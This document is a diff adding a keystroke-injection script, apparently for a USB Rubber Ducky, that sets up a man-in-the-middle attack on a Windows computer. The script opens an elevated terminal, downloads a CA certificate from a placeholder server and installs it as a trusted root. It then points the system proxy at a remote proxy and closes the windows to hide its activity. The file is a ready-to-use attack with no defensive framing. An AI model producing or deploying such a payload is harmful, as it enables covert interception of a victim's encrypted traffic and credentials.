@@ -1,0 +1,60 @@
+REM       |=========================================================================|
+REM         Remote Proxy for MITM attacks
+REM         Author: DVBNL
+REM         Version 1.0
+REM         OS Tested: Windows 11, Windows 10
+REM         Prerequisites are either a local proxy or remote proxy server (preferably with SSL/443)
+REM       |=========================================================================|
+
+ATTACKMODE HID
+
+REM |===Start Windows Terminal as admin===|
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell "start-process wt -verb runas" 
+ENTER
+DELAY 2500
+LEFT
+ENTER
+DELAY 1500
+
+REM |===Powershell Block to download the Burpsuite CA & install it===|
+STRING_POWERSHELL
+    $dir = "C:\temp";
+    $ca = "$dir\root-ca.der";
+    New-Item -Path $dir -ItemType Directory;
+    Invoke-Webrequest -Uri http://yourwebserver/ca.der -OutFile $ca;
+    $certdir = "$ca";
+    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2;
+    $cert.Import($certdir);
+    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine");
+    $store.Open("ReadWrite");
+    $store.Add($cert);
+    $store.Close();
+END_STRING
+ENTER
+
+REM |===Set system proxy to remote proxy server===|
+STRING_POWERSHELL
+    $proxy = "<proxyserverip>:<port>";
+    $bypass = "<local>";
+    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings";
+    $proxyServer = $proxy;
+    $proxyOverride = $bypass;
+    Set-ItemProperty -Path $registryPath -Name ProxyServer -Value $proxyServer;
+    Set-ItemProperty -Path $registryPath -Name ProxyOverride -Value $proxyOverride;
+    Set-ItemProperty -Path $registryPath -Name ProxyEnable -Value 1;
+    Set-ItemProperty -Path $registryPath -Name MigrateProxy -Value 1;
+    Set-ItemProperty -Path $registryPath -Name ProxyHttp1.1 -Value 1;
+    Set-ItemProperty -Path $registryPath -Name ProxyServer -Value $proxyServer;
+    Set-ItemProperty -Path $registryPath -Name ProxyOverride -Value $proxyOverride;
+    Set-ItemProperty -Path $registryPath -Name ProxyEnable -Value 1;
+    Set-ItemProperty -Path $registryPath -Name MigrateProxy -Value 1;
+    Set-ItemProperty -Path $registryPath -Name ProxyHttp1.1 -Value 1;
+END_STRING
+ENTER
+
+REM |===Kill all active wt or powershell processes (Visibility)===|
+STRING Stop-Process -Name powershell, WindowsTerminal
+ENTER
